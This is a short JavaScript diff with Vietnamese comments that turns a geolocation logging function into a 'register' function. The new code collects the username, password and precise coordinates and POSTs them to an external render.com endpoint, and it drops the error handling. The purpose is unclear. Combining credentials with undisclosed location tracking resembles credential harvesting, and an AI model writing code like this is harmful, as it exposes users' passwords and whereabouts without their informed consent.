@@ -1,13 +1,19 @@
-function layViTri() {
+function dangKy() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            console.log("Vị trí của bạn là: Vĩ độ " + lat + ", Kinh độ " + lon);
-        }, function(error) {
-            console.error("Lỗi lấy vị trí:", error);
+            const data = {
+                username: document.getElementById('user').value,
+                password: document.getElementById('pass').value,
+                // Lấy tọa độ dán vào đây để gửi về server
+                location: position.coords.latitude + "," + position.coords.longitude 
+            };
+            
+            // Gửi dữ liệu về server của og
+            fetch('https://cua-og.render.com/api/save-account', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
         });
-    } else {
-        console.log("Trình duyệt không hỗ trợ Geolocation.");
     }
 }
